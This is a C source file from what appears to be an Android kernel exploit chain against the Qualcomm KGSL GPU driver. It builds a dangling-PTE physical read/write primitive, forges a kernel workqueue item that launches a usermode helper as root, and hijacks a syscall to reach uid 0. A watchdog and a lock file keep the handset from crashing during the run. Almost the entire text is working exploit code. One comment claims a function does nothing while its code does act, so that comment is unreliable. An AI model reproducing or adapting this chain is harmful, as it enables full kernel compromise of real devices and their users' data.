static uint64_t pa_to_exec_va(uint64_t pa)    { return pa + g_kvo; }

static int wq_kick_via_pty(void)
{
    int m = posix_openpt(O_RDWR | O_NOCTTY);
    if (m < 0) return -1;
    if (grantpt(m) != 0 || unlockpt(m) != 0) { close(m); return -2; }
    char *sn = ptsname(m);
    if (!sn) { close(m); return -3; }
    int s = open(sn, O_RDWR | O_NOCTTY);
    if (s < 0) { close(m); return -4; }
    /* The master write is what queues the work: pty_write ->
       tty_flip_buffer_push -> tty_schedule_flip -> queue_work(system_unbound_wq,
       &tty->buf.work). One character into an idle tty queues nothing, so the write
       has to overflow the flip buffer. Master only: the slave has no reader and blocks. */
    {
        static char wb[1024];
        for (int q = 0; q < 1024; q++) wb[q] = 'x';
        fcntl(m, F_SETFL, O_NONBLOCK);
        ssize_t wr = write(m, wb, 1024);
        L("[UMH] wake master write=%zd\n", wr); log_fsync();
        if (wr <= 0) { close(s); close(m); return -5; }
    }
    struct timespec ts = { 0, 50 * 1000 * 1000 };
    nanosleep(&ts, NULL);
    close(s); close(m);
    return 0;
}

/* Find the PA of the page to forge: the sentinel is written through the CPU
   alias and the window is scanned for it. Returns 0 when it is not found; there is
   no unbounded retry, the boot window is short. */
static uint64_t forge_page_find(uint64_t sent1, uint64_t sent2, uint32_t *fid_out)
{
    (void)sent1; (void)sent2;
    /* Scan the preallocated pool first: its sentinels were written and cleaned
       right after the trigger. First match inside the window wins. */
    for (int fi = 0; fi < g_nfpre; fi++) {
        uint64_t pa = 0;
        for (uint64_t off = 0; off + 16 <= 0xC0000000ULL; off += 4096) {
            if (sigsetjmp(jmpbuf, 1) == 0) {
                jmp_armed = 1;
                volatile uint64_t *pg = (volatile uint64_t *)(g_lb + off);
                uint64_t a = pg[0], b = pg[1];
                jmp_armed = 0;
                if (a == g_fs1[fi] && b == g_fs2[fi]) { pa = WIN_PA_BASE + off; break; }
            } else { jmp_armed = 0; }
            if (((off >> 20) & 63) == 0) {
                struct timespec rzb; clock_gettime(CLOCK_MONOTONIC, &rzb);
                g_wd_round = (long long)rzb.tv_sec;
            }
        }
        L("[UMH] forge pre[%d] id=%u pa=%llx\n", fi, g_fids[fi],
          (unsigned long long)pa); log_fsync();
        if (pa) {
            *fid_out = g_fids[fi];
            g_forge_u = (volatile uint8_t *)g_fus[fi];
            return pa;
        }
    }
    /* The whole pool landed outside the window, which is very unlikely: try two
       fresh allocations on the spot. */
    for (int retry = 0; retry < 2; retry++) {
        uint32_t fid = 0;
        if (gpuobj_alloc(4096, KGSL_MEMFLAGS_USE_CPU_MAP, &fid) != 0 || !fid) break;
        void *u = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                       MAP_SHARED, kgsl_fd, ((off_t)fid) << 12);
        if (u == MAP_FAILED) { gpuobj_free(fid); break; }
        volatile uint64_t *w = (volatile uint64_t *)u;
        uint64_t s1 = sent1 ^ (uint64_t)(retry + 1) * 0x9E3779B97F4A7C15ULL;
        uint64_t s2 = sent2 + retry * 7919ULL;
        w[0] = s1; w[1] = s2;
        gpuobj_sync(fid, 0, 4096, KGSL_GPUMEM_CACHE_CLEAN);
        uint64_t pa = 0;
        for (uint64_t off = 0; off + 16 <= 0xC0000000ULL; off += 4096) {
            if (sigsetjmp(jmpbuf, 1) == 0) {
                jmp_armed = 1;
                volatile uint64_t *pg = (volatile uint64_t *)(g_lb + off);
                uint64_t a = pg[0], b = pg[1];
                jmp_armed = 0;
                if (a == s1 && b == s2) { pa = WIN_PA_BASE + off; break; }
            } else { jmp_armed = 0; }
            if (((off >> 20) & 63) == 0) {
                struct timespec rzb; clock_gettime(CLOCK_MONOTONIC, &rzb);
                g_wd_round = (long long)rzb.tv_sec;
            }
        }
        L("[UMH] forge live try%d pa=%llx\n", retry, (unsigned long long)pa);
        log_fsync();
        if (pa) {
            *fid_out = fid;
            g_forge_u = (volatile uint8_t *)u;
            return pa;
        }
        munmap(u, 4096); gpuobj_free(fid);
    }
    L("[UMH] forge page unavailable\n"); log_fsync();
    return 0;
}

/* 0 = done; negative = the stage that failed. Stages that fail before the work
   is linked into the pool leave nothing behind. */
static int forge_sub_info_and_run(uint64_t forge_pa)
{
    const uint64_t forge_va = pa_to_lin_va(forge_pa);   /* linear-map VA; the pool head points at it */
    volatile uint64_t *F = (volatile uint64_t *)g_forge_u;  /* userspace CPU VA of the forged page */
    uint8_t *Fb = (uint8_t *)F;
    const uint64_t wq_ptr_pa = g_img_pa + OFF_SYSTEM_UNBOUND_WQ;
    const uint64_t jt_pa     = g_img_pa + OFF_UMH_EXEC_WORK_JT;

    if (*win_ptr(g_img_pa + OFF_UMH_DISABLED) != 0) { L("[UMH] umh disabled\n"); return -1; }
    uint64_t wq_va = *win_ptr(wq_ptr_pa);
    uint64_t wq_pa = lin_va_to_pa(wq_va);
    volatile char *np = (volatile char *)win_ptr(wq_pa + 192);
    const char *exp = "events_unbound";
    for (int i = 0; i < 14; i++)
        if (np[i] != exp[i]) { L("[UMH] wq name mismatch\n"); return -2; }
    uint64_t pwq_va  = *win_ptr(wq_pa + 0xb0);
    uint64_t pool_va = *win_ptr(lin_va_to_pa(pwq_va + 0x00));
    uint32_t color   = (uint32_t)*win_ptr(lin_va_to_pa(pwq_va + 0x10));
    uint32_t refcnt  = (uint32_t)*win_ptr(lin_va_to_pa(pwq_va + 0x18));
    uint32_t nreact  = (uint32_t)*win_ptr(lin_va_to_pa(pwq_va + 0x58));
    uint32_t maxact  = (uint32_t)*win_ptr(lin_va_to_pa(pwq_va + 0x5c));
    uint32_t nr_idle = (uint32_t)*win_ptr(lin_va_to_pa(pool_va + 0x34));
    uint64_t head_va = pool_va + 0x20;
    uint64_t head_pa = lin_va_to_pa(head_va);
    L("[UMH] pwq=%llx pool=%llx color=%u ref=%u na=%u/%u idle=%u\n",
      (unsigned long long)pwq_va, (unsigned long long)pool_va,
      color, refcnt, nreact, maxact, nr_idle);

    if (*win_ptr(head_pa) != head_va) { L("[UMH] gate1 busy\n"); return -3; }
    if (nr_idle == 0)            { L("[UMH] gate2\n"); return -3; }
    if (color >= 15)             { L("[UMH] gate3\n"); return -3; }
    if (refcnt == 0)             { L("[UMH] gate4\n"); return -3; }
    if (nreact >= maxact)        { L("[UMH] gate5\n"); return -3; }

    /* Forged work item; sub_info starts inside the work itself. */
    F[0] = (pwq_va | ((uint64_t)color << 4) | 0x5ULL);
    F[1] = head_va; F[2] = head_va; F[3] = pa_to_exec_va(jt_pa);
    F[4] = 0; F[5] = 0;
    F[6]  = forge_va + 0x280;   /* complete */
    F[7]  = forge_va + 0x300;   /* path */
    F[8]  = forge_va + 0x380;   /* argv */
    F[9]  = forge_va + 0x3C0;   /* envp */
    F[10] = 0;                  /* file */
    *(volatile uint32_t *)(Fb + 88) = 0;          /* wait=NO_WAIT */
    *(volatile uint32_t *)(Fb + 92) = FORGE_RETVAL_SENTINEL;   /* retval */
    *(volatile uint32_t *)(Fb + 96) = 0;          /* pid */
    F[13] = 0; F[14] = 0; F[15] = 0;
    volatile uint64_t *C = F + 0x280 / 8;
    C[0] = 0; C[1] = 0;
    C[2] = forge_va + 0x280 + 16; C[3] = C[2];
    volatile char *P = (volatile char *)F + 0x300;
    const char *path = "/data/local/tmp/umh_root";
    for (int i = 0; i < 25; i++) P[i] = path[i];
    volatile uint64_t *A = F + 0x380 / 8;
    A[0] = forge_va + 0x300; A[1] = 0;
    const char *pe = "PATH=/sbin:/system/bin:/system/xbin";
    volatile char *es = (volatile char *)F + 0x400;
    for (int i = 0; i < 36; i++) es[i] = pe[i];
    volatile uint64_t *E = F + 0x3C0 / 8;
    E[0] = forge_va + 0x400; E[1] = 0;
    if (F[0] != (pwq_va | ((uint64_t)color << 4) | 0x5ULL) ||
        F[3] != pa_to_exec_va(jt_pa) ||
        *(volatile uint32_t *)(Fb + 92) != FORGE_RETVAL_SENTINEL)
        { L("[UMH] readback fail\n"); return -4; }
    gpuobj_sync(g_forge_id, 0, 1024, KGSL_GPUMEM_CACHE_CLEAN);  /* flush the rest of the page in case the readback raced the write */

    volatile uint32_t *nif = (volatile uint32_t *)win_ptr(lin_va_to_pa(pwq_va + 0x1c + 4 * color));
    *nif = *nif + 1;
    volatile uint32_t *nra = (volatile uint32_t *)win_ptr(lin_va_to_pa(pwq_va + 0x58));
    *nra = *nra + 1;
    volatile uint32_t *rfc = (volatile uint32_t *)win_ptr(lin_va_to_pa(pwq_va + 0x18));
    *rfc = *rfc + 1;
    *win_ptr(head_pa)     = forge_va + 8;
    *win_ptr(head_pa + 8) = forge_va + 8;
    F[1] = head_va; F[2] = head_va;

    if (wq_kick_via_pty() != 0) { L("[UMH] wake fail\n"); return -5; }
    /* Single-shot queueing, cacheable read side. Rewriting the hot-locked pool
       line through the non-coherent window loses the race and corrupts the work list,
       which panics the phone, so this path only probes: a clean DRAM read means the
       work was taken, otherwise rc = -7 and nothing was harmed. */
    if (wq_kick_via_pty() != 0) { L("[UMH] wake fail\n"); return -5; }
    for (int t = 0; t < 600; t++) {
        struct stat stx;
        if (stat("/data/local/tmp/umh_ok", &stx) == 0) {
            L("[UMH] GO: umh_ok t=%d\n", t); log_fsync();
            return 0;
        }
        uint64_t d0 = *(volatile uint64_t *)g_forge_u;   /* cacheable read of work.data */
        if (!(d0 & 1UL)) {                                /* PENDING cleared: the helper picked it up */
            for (int w2 = 0; w2 < 400; w2++) {
                if (stat("/data/local/tmp/umh_ok", &stx) == 0)
                    { L("[UMH] GO late t=%d\n", t + w2); log_fsync(); return 0; }
                struct timespec ts2 = { 0, 50 * 1000 * 1000 };
                nanosleep(&ts2, NULL);
                { struct timespec rzb2; clock_gettime(CLOCK_MONOTONIC, &rzb2);
                  g_wd_round = (long long)rzb2.tv_sec; }
            }
            L("[UMH] taken but helper dead: retval=%d\n",
              (int)*(volatile uint32_t *)((uint8_t *)g_forge_u + 92));
            log_fsync();
            return -6;
        }
        struct timespec ts = { 0, 50 * 1000 * 1000 };
        nanosleep(&ts, NULL);
        { struct timespec rzb; clock_gettime(CLOCK_MONOTONIC, &rzb);
          g_wd_round = (long long)rzb.tv_sec; }
    }
    L("[UMH] timeout: single-shot not taken (sealed route)\n"); log_fsync();
    return -7;
}

static int gpu_control_check(struct gpu_ctx_t *g, uint32_t dst_id, void *dst_u, uint64_t dst_g)
{
    L("=== control group: GPU 0x3D writes DST+0x1000 = 0xCAFE3311 -> read back ===\n");
    uint32_t ib[16];
    uint32_t len = 0;
    len += cp_nop(&ib[len], 0x0);
    len += cp_mem_write(&ib[len], dst_g + 0x1000, 0xCAFE3311u);
    len += cp_wait_mem_writes(&ib[len]);
    len += cp_nop(&ib[len], 0x0);
    int r = submit_ib(g, ib, len);
    if (r != 0) { L("[!] control group submit FAILED errno=%d\n", errno); return -1; }
    usleep(200 * 1000);
    gpuobj_sync(dst_id, 0x1000, 4, KGSL_GPUMEM_CACHE_INV);
    uint32_t rb = *(volatile uint32_t *)((char *)dst_u + 0x1000);
    L("[D] control group: wrote 0xCAFE3311, read back 0x%08x %s\n", rb, rb == 0xCAFE3311u ? "PASS" : "FAIL");
    return (rb == 0xCAFE3311u) ? 0 : -1;
}

static int gpu_copy_selftest(struct gpu_ctx_t *g, uint32_t id, void *u, uint64_t gpu)
{
    volatile uint32_t *p = (volatile uint32_t *)u;
    p[0x3000 / 4] = 0x13579BDFu;
    p[0x4000 / 4] = 0;
    if (gpuobj_sync(id, 0x3000, 8, KGSL_GPUMEM_CACHE_CLEAN) != 0) return -1;
    uint32_t ib[16], len = 0;
    len += cp_nop(&ib[len], 0);
    len += cp_memcpy(&ib[len], 1, gpu + 0x3000, gpu + 0x4000);
    len += cp_wait_mem_writes(&ib[len]);
    len += cp_nop(&ib[len], 0);
    if (submit_ib(g, ib, len) != 0) return -1;
    if (wait_submit_retire(g->ctx, last_submit_ts) != 0) return -1;
    if (gpuobj_sync(id, 0x4000, 4, KGSL_GPUMEM_CACHE_INV) != 0) return -1;
    L("[D] CP_MEMCPY selftest: src=0x%08x dst=0x%08x %s\n",
      p[0x3000 / 4], p[0x4000 / 4],
      p[0x4000 / 4] == 0x13579BDFu ? "PASS" : "FAIL");
    return p[0x4000 / 4] == 0x13579BDFu ? 0 : -1;
}

static int safe_selftest(void)
{
    struct gpu_ctx_t g = {0};
    uint32_t id = 0;
    if (setup_ib(&g) != 0) return -1;
    if (gpuobj_alloc(0x10000, KGSL_MEMFLAGS_USE_CPU_MAP, &id) != 0) return -1;
    void *u = mmap(NULL, 0x10000, PROT_READ | PROT_WRITE, MAP_SHARED,
                   kgsl_fd, ((off_t)id) << 12);
    if (u == MAP_FAILED) return -1;
    uint64_t gpu = 0;
    if (gpuobj_info(id, &gpu) != 0 || gpu == 0) return -1;
    int r = gpu_control_check(&g, id, u, gpu);
    if (r == 0) r = gpu_copy_selftest(&g, id, u, gpu);
    if (r == 0) {
        /* Synthetic, self-owned memdesc-shaped record: validates readback and
           KASLR derivation without any stale pointer or UAF access. */
        volatile uint8_t *q = (volatile uint8_t *)u;
        *(volatile uint64_t *)(q + 0x48) = STATIC_OPS_ADDR;
        *(volatile uint64_t *)(q + 0x50) = 0xBA00ULL;
        *(volatile uint64_t *)(q + 0x30) = 0x40000000ULL;
        *(volatile uint64_t *)(q + 0x28) = 0x90080000ULL;
        if (gpuobj_sync(id, 0x28, 0x30, KGSL_GPUMEM_CACHE_CLEAN) != 0) {
            L("[!] synthetic source cache clean FAIL\n");
            r = -1;
        }
        if (r == 0) {
            static const uint32_t so[] = {0x28, 0x30, 0x48, 0x50};
            static const uint32_t sv[] = {0x90080000u, 0x40000000u,
                                          (uint32_t)STATIC_OPS_ADDR, 0xBA00u};
            for (unsigned int si = 0; si < sizeof(so) / sizeof(so[0]); si++) {
                uint32_t got = 0;
                if (gpu_read_one(&g, gpu, id, u, gpu, so[si],
                                 0x5000 + si * 4, &got, "SELF-ALIGN") != 0 ||
                    got != sv[si]) {
                    L("[!] synthetic CP_MEMCPY offset 0x%x FAIL\n", so[si]);
                    r = -1;
                    break;
                }
            }
        }
        if (r == 0) {
            static const uint32_t mo[] = {0x28, 0x30, 0x48, 0x50};
            static const uint32_t mv[] = {0x90080000u, 0x40000000u,
                                          (uint32_t)STATIC_OPS_ADDR, 0xBA00u};
            for (unsigned int mi = 0; mi < sizeof(mo) / sizeof(mo[0]); mi++) {
                uint32_t got = 0;
                if (gpu_read_one_m2m(&g, gpu, id, u, gpu, mo[mi],
                                     0x6000 + mi * 4, &got, "SELF-M2M") != 0 ||
                    got != mv[mi]) {
                    L("[!] synthetic CP_MEM_TO_MEM offset 0x%x FAIL\n", mo[mi]);
                    r = -1;
                    break;
                }
            }
        }
        if (r == 0) {
            if (gpu_read_memdesc(&g, gpu, id, u, gpu, "SELF-MEMDESC") != 0 ||
                diag_ops != STATIC_OPS_ADDR || diag_flags != 0xBA00ULL ||
                diag_size != 0x40000000ULL || diag_phys != 0x90080000ULL ||
                derive_runtime_kernel_addrs(diag_ops) != 0) {
                L("[!] synthetic memdesc readback/slide selftest FAIL\n");
                r = -1;
            } else {
                L("[D] synthetic memdesc readback/KASLR selftest PASS\n");
            }
        }
    }
    munmap(u, 0x10000);
    gpuobj_free(id);
    return r;
}




/* Read back through the GPU: CP_MEMCPY pulls the masqueraded page in through the
   dangling PTE. The GPU walks the same LLCC path, so a non-zero value means the write
   landed (a zero read by the CPU is a cache-visibility problem) and all zeros mean it
   never reached DRAM at all. */

static void read_phys_proof(uint64_t phys, uint32_t expect, uint32_t *got)
{
    L("=== check d: arbitrary physical read; masquerade phys 0x%llx (+0x800) ===\n", (unsigned long long)phys);
    for (size_t ci = 0; ci < n_pte_chunks; ci++) {
        volatile uint32_t *p = (volatile uint32_t *)((char *)pte_chunks[ci] + 0x100000 + 0x800);
        uint32_t v = *p;
        L("[+] chunk 0x%zx read phys 0x%llx+0x800 = 0x%08x%s\n", pte_chunks[ci],
            (unsigned long long)phys, v,
            (expect && v == expect) ? " <- matches the expected kernel.elf value!" : "");
        *got = v;
        return;
    }
    L("[-] no readable chunk (page-table page masquerade failed?)\n");
}

/* mprotect every spray block, to force a kernel PTE walk and a TLB flush so the
   PTEs the GPU wrote take effect.
   The base and the region list are never written, so the guard below is always false and the
   region loop runs zero times. The function's only effect is its log line. */
static void flush_blocks_tlb(void)
{
    /* The 512MB range plus every pressure region, because a freed page can sit in
       any of their page tables. Two stages, NONE then RW: an mprotect to the
       permissions the mapping already has can be short-circuited by the kernel and
       flush nothing. */
    L("[*] mprotect(NONE->RW) pre-spray 512MB of PTEs + %d pressure regions...\n", n_press_regs);
    if (pts_spray_base) {
        mprotect(pts_spray_base, 512UL * 1024 * 1024, PROT_NONE);
        mprotect(pts_spray_base, 512UL * 1024 * 1024, PROT_READ | PROT_WRITE);
    }
    for (int pi = 0; pi < n_press_regs; pi++) {
        mprotect(press_regs[pi], PRESSURE_SIZE, PROT_NONE);
        mprotect(press_regs[pi], PRESSURE_SIZE, PROT_READ | PROT_WRITE);
    }
}

struct gpu_ctx_t spare_g;

#define PREBURN_ENTRIES 32768   /* small recycle buffer, so the spray crosses its threshold sooner */
static uint32_t preburn_ids[PREBURN_ENTRIES];
int n_preburn = 0;   /* global: the ids are freed later, which releases their rbtree nodes */
/* watchdog: checks every 2s, then parks the process after 600s in total or 30s
   stuck in one stage. Parking keeps the phone alive instead of letting the chain take it
   down. */
static volatile long long g_wd_start = 0;
static void *watchdog_main(void *arg)
{
    (void)arg;
    for (;;) {
        /* wdcmd is the only external command channel available inside main's address
           space: the fork server has no window, and main does not read rootcmd while it
           is parked. RELEASE_MAIN makes the last fd holder exit, so heal and FREE_ALL
           must already be done by the server or the window frames and the SMMU stay live. */
        {
            static long long wd_cur = -1;
            int wfd = open("/data/local/tmp/wdcmd", O_RDONLY);
            if (wfd >= 0) {
                char wb2[256]; int ln2 = 0;
                /* Guard against stale commands: on the first open seek to EOF, or a
                   RELEASE_MAIN left behind by the previous run makes this run's main exit
                   the moment it starts. */
                off_t wd_end = lseek(wfd, 0, SEEK_END);
                if (wd_cur < 0) wd_cur = (wd_end >= 0) ? (long long)wd_end : 0;
                else if (wd_end >= 0 && wd_end < wd_cur) wd_cur = 0;  /* truncated: restart from 0 */
                lseek(wfd, wd_cur, SEEK_SET);
                ssize_t rr = read(wfd, wb2, sizeof(wb2) - 1);
                if (rr > 0) {
                    wd_cur += rr;
                    for (ssize_t q = 0; q < rr; q++) {
                        if (wb2[q] == '\n') {
                            wb2[q] = 0;
                            if (!strncmp(wb2, "RELEASE_MAIN", 12)) {
                                L("[WD] RELEASE_MAIN; controlled exit\n");
                                log_fsync();
                                syscall(SYS_write, 1, "[WD] bye\n", sizeof("[WD] bye\n") - 1);
                                syscall(SYS_exit_group, 0);
                            }
                            if (!strncmp(wb2, "STOP_HB", 7)) {
                                /* The watchdog is a thread of main in the same address space,
                                   so hb_halt() reaches it. */
                                L("[WD] STOP_HB\n");
                                hb_halt();
                            }
                            q++;
                            memmove(wb2, wb2 + q, (size_t)(rr - q));
                            rr -= q; q = -1;
                        }
                    }
                }
                close(wfd);
            }
        }
        struct timespec wt0, wt1;
        clock_gettime(CLOCK_MONOTONIC, &wt0);
        sleep(2);
        clock_gettime(CLOCK_MONOTONIC, &wt1);
        long long now = (long long)wt1.tv_sec;
        if (g_wd_start && (now - g_wd_start) > 600) {
            L("[!] watchdog global limit of 600s exceeded; pausing to preserve the device (kill causes a teardown crash)\n");
            uaf_pause();
        }
        /* Once the payload reports that it fired, the main thread is
           stuck in the patched syscall and the process is already uid 0, so the watchdog
           takes over the root-finishing fork server. */
        if (1) {   /* heartbeat: sample g_pkey_call_inflight */
            static int hb_n = 0;
            if ((++hb_n % 15) == 0) {
                /* The patched syscall's result is reported from here rather than from the
                   main thread, which may already be wedged inside the kernel. No extra log write
                   is added: a direct write can block in f2fs writeback. */
                L("[PKEY-HB] pkey_inflight=%d @%p wd_round=%lld | 289 return=%ld uid=%d\n",
                  (int)g_pkey_call_inflight, (void *)&g_pkey_call_inflight,
                  (long long)g_wd_round, g_pkey_ret, g_uid_after_pkey);
                log_fsync();
            }
        }
        if (g_pkey_call_inflight) {
            /* While the main thread is spinning in the kernel, reading its task lock out
               of /proc fails, so the takeover cannot be gated on a Uid check from out
               here. The fired flag plus a short buffer is the whole condition. */
            {
                static int pkey_inflight_ticks = 0;
                if (pkey_inflight_ticks < 3) pkey_inflight_ticks++;
                if (pkey_inflight_ticks == 3) {
                    static int takeover_done = 0;
                    if (!takeover_done) {
                        takeover_done = 1;
                        L("[PKEY-WD] watchdog taking over unconditionally (fired+6s, "
                          "three rounds already confirmed)\n");
                        log_fsync();
                        /* A forked child inherits the credentials of the calling thread, so
                           the watchdog's child is still uid 2000: a probe and a relay for
                           rootcmd, not a root process in its own right. */
                        pid_t spid = fork();
                        if (spid == 0) {
                            signal(SIGSEGV, SIG_DFL);
                            signal(SIGBUS,  SIG_DFL);
                            signal(SIGALRM, SIG_DFL); alarm(0);
                            signal(SIGTERM, SIG_IGN);
                            signal(SIGINT,  SIG_IGN);
                            signal(SIGHUP,  SIG_IGN);
                            /* Probe only: it reports the watchdog's own view and the state of the
                               main process. It is not a root executor; the root belongs to the main
                               thread. */
                            int pf = syscall(SYS_openat, AT_FDCWD,
                                "/data/local/tmp/root_proof.txt",
                                O_WRONLY | O_APPEND, 0644);
                            if (pf >= 0) {
                                syscall(SYS_write, pf,
                                    "PKEY_HIJACK_INFLIGHT_WATCHDOG_TAKEOVER\n", sizeof("PKEY_HIJACK_INFLIGHT_WATCHDOG_TAKEOVER\n") - 1);
                                syscall(SYS_close, pf);
                            }
                            for (;;) pause();
                        }
                        L("[PKEY-WD] probe child pid=%d\n", (int)spid);
                        log_fsync();
                    }
                }
            }
        }
        /* A parked main is the success end state, not a stage hang: uaf_pause
           never feeds the stage counter, so once the root server is forked the
           counter is frozen by design. Reporting a stage timeout there is a lie
           that has been read as a chain failure. */
        if (g_wd_round && (now - g_wd_round) > 30 && !g_srv_pid) {
                /* Liveness verdict on the main process: the thread count is recorded
                   before the dump, because a dead main with threads still alive shows up
                   there directly. */
                {
                    char lb2[128]; int ln2 = 0;
                    const char wd_hdr[] = "[WD] threads=";
                    for (const char *q = wd_hdr; *q; q++) lb2[ln2++] = *q;
                    unsigned tv = 0;
                    {
                        char pf[64]; snprintf(pf, sizeof(pf), "/proc/%d/status", getpid());
                        FILE *sf2 = fopen(pf, "r"); char bl[256];
                        while (sf2 && fgets(bl, sizeof(bl), sf2))
                            if (!strncmp(bl, "Threads:", 8)) { tv = (unsigned)atoi(bl + 8); break; }
                        if (sf2) fclose(sf2);
                    }
                    { unsigned v = tv; char nb[12]; int nn = 0;
                      if (!v) nb[nn++] = '0'; while (v) { nb[nn++] = '0' + (v % 10); v /= 10; }
                      while (nn) lb2[ln2++] = nb[--nn]; }
                    lb2[ln2++] = '\n';
                    syscall(SYS_write, 1, lb2, (long)ln2);
                }
                /* Dump the syscall of every thread, to diagnose a silent hang. */
            {
                char p[128];
                snprintf(p, sizeof(p), "/proc/%d/task", getpid());
                DIR *d = opendir(p);
                if (d) {
                    struct dirent *e;
                    while ((e = readdir(d)) != NULL) {
                        if (e->d_name[0] == '.') continue;
                        char f[160], line[256];
                        FILE *sf;
                        snprintf(f, sizeof(f), "/proc/%d/task/%s/comm", getpid(), e->d_name);
                        sf = fopen(f, "r");
                        if (sf) { if (fgets(line, sizeof(line), sf)) L("[WD] tid %s comm %s", e->d_name, line); fclose(sf); }
                        snprintf(f, sizeof(f), "/proc/%d/task/%s/syscall", getpid(), e->d_name);
                        sf = fopen(f, "r");
                        if (sf) { if (fgets(line, sizeof(line), sf)) L("[WD] tid %s syscall %s", e->d_name, line); fclose(sf); }
                    }
                    closedir(d);
                }
            }
            L("[!] watchdog stage timeout of 30s; pausing to preserve the device\n");
            log_fsync();
            uaf_pause();
        }
    }
    return NULL;
}
/* Two env helpers with different semantics. env_on() treats "0" and the empty string
   as off; anything else that tests existence treats both as on. Three switches use
   existence only: PKEY_HIJACK_ONLY, POC_LOG_FILE and BLIND_WRITE_AFTER_ROOT, so an
   empty value enables them. */
static int env_on(const char *k)
{
    const char *v = getenv(k);
    return v != NULL && v[0] != '\0' && v[0] != '0';
}
/* ev(): print the value a variable actually has, so the log can answer "what was
   this run configured with" instead of leaving it to be guessed. */
static const char *ev(const char *k)
{
    const char *v = getenv(k);
    return v ? v : "(unset)";
}

int main(int argc, char **argv)
{
    { ssize_t w = write(1, "ALIVE-MAIN\n", 11); (void)w; }
    /* Compile-time settings first in every log: without them a build that cannot
     * root is indistinguishable from one that can. TRIGGER=0 returns 2 right away, while
     * PRIV_WRITE=0 falls through to the watchdog park, which looks exactly like a hang. */
    L("[CFG] TRIGGER=%d PRIV_WRITE=%d PER_BATCH=%d BATCH_DELAY_MS=%d"
      " RETIRE_ON=%d argc=%d\n",
      V7_ENABLE_TRIGGER, V7_ENABLE_PRIV_WRITE, ROSCAN_BATCH_PAGES,
      ROSCAN_BATCH_DELAY_MS, ROSCAN_WAIT_RETIRE, argc);
    /* The environment is logged too, because this is the only way a run's log can
     * answer which switches it ran under. One of them decides the whole post-root tail,
     * and a comment is only visible to whoever wrote the program. */
    L("[ENV] PKEY_HIJACK_ONLY=%s UMHONLY=%s LEGACY_BLIND_WRITE=%s BLIND_WRITE_AFTER_ROOT=%s"
      " REL_FORCE=%s POC_LOG_FILE=%s\n",
      ev("PKEY_HIJACK_ONLY"), ev("UMHONLY"), ev("LEGACY_BLIND_WRITE"), ev("BLIND_WRITE_AFTER_ROOT"),
      ev("REL_FORCE"), ev("POC_LOG_FILE"));
    /* The single-instance lock has to be genuinely exclusive. Truncating a pidfile is
     * not: two chains then race for the same dangling window, a fixed 65539 pages, and
     * the loser sees zeros where the winner sees data. Losing that race also doubles the
     * time to root.
     *   - O_CREAT|O_EXCL, and exit before touching the GPU when the lock is held. This
     *     line runs before the dangling window exists, so an early exit cannot reach
     *     kgsl teardown, which is the one thing the park below must never do.
     *   - No flock: cloned children inherit the descriptor and root orphans outlive the
     *     parent, so the lock would never be released. */
    g_main_tid = (int)gettid();
    {
        static const char LOCKP[] = "/data/local/tmp/poc.lock";
        char pbuf[16];
        int pn = snprintf(pbuf, sizeof(pbuf), "%d", (int)getpid());
        int won = 0;

        /* link() is not usable here: it returns EACCES because the shell domain may
         * not create hard links, while open(O_CREAT) is allowed. So the lock is
         * O_CREAT|O_EXCL, with three defences, one per way it can fail:
         *   1. the file exists, therefore somebody is running
         *   2. if it cannot be taken, exit; never take a stale lock over. "pid unreadable"
         *      covers four cases and only one of them is a dead owner, so the other three
         *      would unlink somebody else's live lock. Ambiguity fails closed.
         *   3. the window between create and write is absorbed by the EEXIST retries */
        int lk = -1;
        for (int att = 0; att < 5 && !won; att++) {
            lk = open(LOCKP, O_CREAT | O_EXCL | O_WRONLY, 0644);
            if (lk >= 0) { won = 1; break; }
            if (errno != EEXIST) {
                L("[!] cannot open %s (errno=%d); fail-closed, not starting\n", LOCKP, errno);
                log_fsync();
                return 0;
            }
            /* Lock held by someone else. Read the holder's pid. */
            int rd = open(LOCKP, O_RDONLY);
            char rb[16];
            int old = 0, got = 0;
            if (rd >= 0) {
                ssize_t rn = read(rd, rb, sizeof(rb) - 1);
                if (rn > 0) { rb[rn] = 0; old = atoi(rb); got = (old > 0); }
                close(rd);
            }
            /* A readable, live pid means another chain really is running: do not start. */
            if (got && old != (int)getpid() && kill((pid_t)old, 0) == 0) {
                L("[!] a chain instance is already running (lock pid=%d); not starting this round, racing its window would harm it\n", old);
                log_fsync();
                return 0;
            }
            /* Unreadable means the holder may still be writing its pid, not that it died,
               so retry; after five attempts stay closed rather than guess. */
            if (att == 4) {
                L("[!] lock exists but the pid cannot be read (unreadable is not proof of death); not stealing it, fail-closed\n");
                log_fsync();
                return 0;
            }
            usleep(50 * 1000);
        }
        if (won && lk >= 0) {
            /* Check the write result: a short write publishes an empty lock, every reader
             * then fails closed after five retries, and the run never starts. Write through
             * the descriptor we already hold rather than reopening the path. */
            ssize_t w = write(lk, pbuf, (size_t)pn);
            close(lk);
            if (w != (ssize_t)pn) {
                unlink(LOCKP);   /* withdraw our half-written lock instead of leaving it for the next reader */
                L("[!] lock write incomplete (%zd/%d); rolling back and failing closed\n", w, pn);
                log_fsync();
                return 0;
            }
        }
        /* The pid check on the handset is only a backstop: /data/local/tmp survives a
         * restart, pids are renumbered every boot, and this chain spawns hundreds of
         * children. The launcher removing the file before each run is the real mechanism. */
    }
    /* Print the parent/child relationship: if a second chain ever shows up, its ppid
       answers where it came from. */
    L("[ORIGIN] pid=%d ppid=%d pgid=%d sid=%d\n",
      (int)getpid(), (int)getppid(), (int)getpgrp(), (int)getsid(0));
    struct sigaction sa = { .sa_sigaction = segv_handler, .sa_flags = SA_SIGINFO };
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);
    /* Hang watchdog: an ioctl blocked longer than WD seconds exits the process instead
       of letting the phone restart. */
    struct sigaction wa = { .sa_handler = hang_handler };
    sigaction(SIGALRM, &wa, NULL);
    /* SIGTERM/SIGINT/SIGHUP park instead of exiting, so kill signals cannot trigger the
       teardown crash. The handlers reset across exec, so a root shell behaves normally. */
    {
        struct sigaction ps = { .sa_handler = uaf_pause_h };
        sigaction(SIGTERM, &ps, NULL);
        sigaction(SIGINT, &ps, NULL);

        sigaction(SIGHUP, &ps, NULL);
    }
    setvbuf(stdout, NULL, _IONBF, 0);
    /* No log file on f2fs by default. Host-side observation goes through stdout, and a
       write() to a pipe touches none of f2fs's writeback, checkpoint or GC paths, which
       leaves safe_sync/safe_fsync as the only sync points. POC_LOG_FILE=1 buys a copy on
       the handset and brings the sync risk back with it. */
    if (getenv("POC_LOG_FILE"))
